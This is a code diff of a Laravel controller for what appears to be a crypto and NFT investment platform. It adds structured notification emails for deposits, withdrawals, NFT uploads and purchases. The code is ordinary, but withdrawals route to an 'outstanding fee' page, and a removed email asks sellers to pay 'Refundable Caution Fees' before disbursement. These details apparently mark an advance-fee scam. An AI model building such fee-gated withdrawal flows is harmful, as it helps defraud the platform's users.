@@ -135,7 +135,17 @@ class DashboardController extends Controller
             'transaction_proof' => $uploadResult['secure_url'],
         ]);
 
-        // Rest of your email and redirect logic...
+        // Send deposit pending email
+        try {
+            $emailData = array_merge(
+                ['name' => Auth::user()->name, 'date' => now()->format('M d, Y h:i A')],
+                \App\Helpers\CurrencyHelper::emailAmountData($request->amount)
+            );
+            Mail::to(Auth::user()->email)->send(new DepositPending($emailData));
+        } catch (\Exception $e) {
+            Log::error('Deposit pending email failed: ' . $e->getMessage());
+        }
+
         return redirect()->route('home')->with('success', 'Deposit has been detected, please wait for confirmation.');
     }
 
@@ -474,7 +484,24 @@ Remember to be prompt when dealing with crypto-currency withdrawals on the Block
             return view('dashboard.restricted', $data);
         } else {
 
-            Mail::to($email)->send(new WithdrawalPendingMail($userMessage));
+            // Send structured withdrawal pending email
+            try {
+                $newBalance = $balance - $amount;
+                $withdrawalEmailData = array_merge(
+                    [
+                        'name' => $full_name,
+                        'method' => $withdrawalData['withdrawal_method'] ?? 'crypto',
+                        'reference' => $reference,
+                        'date' => now()->format('M d, Y h:i A'),
+                    ],
+                    \App\Helpers\CurrencyHelper::emailAmountData($amount),
+                    \App\Helpers\CurrencyHelper::emailBalanceData(max(0, $newBalance))
+                );
+                Mail::to($email)->send(new WithdrawalPendingMail($withdrawalEmailData));
+            } catch (\Exception $e) {
+                Log::error('Withdrawal pending email failed: ' . $e->getMessage());
+            }
+
             return view('dashboard.oustandading_fee', $data);
         }
 
@@ -733,12 +760,23 @@ Remember to be prompt when dealing with crypto-currency withdrawals on the Block
 
         $nft->save();
 
-        // Send notification
+        // Send NFT upload notification email
         $full_name = Auth::user()->name;
         $email = Auth::user()->email;
-        $message = "$full_name ($email) has just uploaded a new NFT. Please login to your admin dashboard to confirm the transaction.";
 
-        // You can now trigger mail or notification here if required
+        try {
+            $nftEmailData = [
+                'name' => $full_name,
+                'nft_name' => $nft->ntf_name,
+                'price_formatted' => \App\Helpers\CurrencyHelper::format($nft->nft_price, 2),
+                'eth_amount' => \App\Helpers\CurrencyHelper::formatEth($nft->nft_price),
+                'reference' => 'NFT-' . $nft->id,
+                'date' => now()->format('M d, Y h:i A'),
+            ];
+            Mail::to($email)->send(new nftUserEmail($nftEmailData));
+        } catch (\Exception $e) {
+            Log::error('NFT upload email failed: ' . $e->getMessage());
+        }
 
         return back()->with('status', 'NFT uploaded successfully. Please wait for approval from the administration.');
     }
@@ -1648,18 +1686,32 @@ Remember to be prompt when dealing with crypto-currency withdrawals on the Block
         $buy->save();
 
 
+        // Calculate buyer's new balance
+        $buyerId = $currentUser->id;
+        $depTotal = Transaction::where('user_id', $buyerId)->where('transaction_type', 'Deposit')->where('status', '1')->sum('transaction_amount');
+        $wdTotal = Transaction::where('user_id', $buyerId)->where('transaction_type', 'Withdrawal')->whereIn('status', ['0', '1'])->sum('transaction_amount');
+        $profitTotal = Transaction::where('user_id', $buyerId)->where('transaction_type', 'Profit')->where('status', '1')->sum('transaction_amount');
+        $debitTotal = Transaction::where('user_id', $buyerId)->where('transaction_type', 'DebitProfit')->where('status', '1')->sum('transaction_amount');
+        $buyerBalance = $depTotal + ($profitTotal - $debitTotal) - $wdTotal;
+
         // Prepare the data for the email
         $data = [
-            'name' => $user->name,
-            'ntf_name' => $nft_details->ntf_name,
-            'nft_price' => number_format($nft_details->nft_price, 2),
-            'subject' => "Successful Purchase of Your Artwork titled {$nft_details->ntf_name} – Action Required",
-            'message' => "Dear {$user->name},\n\nWe are pleased to inform you that your digital artwork titled '{$nft_details->ntf_name}' has been successfully purchased. Your buyer has made the full payment for the artwork, including the associated refundable caution fee.\n\nTo complete the final stages, please sign in to your account on our corporate website and verify that the amount summing [0.00 ETH] you offered for the purchase has been successfully credited to your Artisttocollectors Wallet in current market value conversion [0.00 USD].\n\nPlease ensure that you complete the payment process for any outstanding Refundable Caution Fees to enable the disbursement of your digital asset. Finalizing these steps will conclude the transaction and unlock the full benefits and incentives offered by our platform.\n\nWe appreciate your prompt attention to this matter and look forward to your continued success.\n\nWarm regards,\nAdmin.\nArtisttocollectors Inc.",
+            'name' => $currentUser->name,
+            'nft_name' => $nft_details->ntf_name,
+            'price_formatted' => \App\Helpers\CurrencyHelper::format($nft_details->nft_price, 2),
+            'eth_amount' => \App\Helpers\CurrencyHelper::formatEth($nft_details->nft_price),
+            'seller' => $user->name,
+            'balance_formatted' => \App\Helpers\CurrencyHelper::format($buyerBalance, 2),
+            'balance_eth' => \App\Helpers\CurrencyHelper::formatEth($buyerBalance),
+            'date' => now()->format('M d, Y h:i A'),
         ];
-        $subject = "Successful Purchase of Your Artwork titled {$nft_details->ntf_name} – Action Required";
 
         // Send the email
-        Mail::to($user->email)->send(new PurchaseNft($data, $subject));
+        try {
+            Mail::to($currentUser->email)->send(new PurchaseNft($data));
+        } catch (\Exception $e) {
+            Log::error('NFT purchase email failed: ' . $e->getMessage());
+        }
 
         return back()->with('status', 'NFT has been purchased successfully');
     }
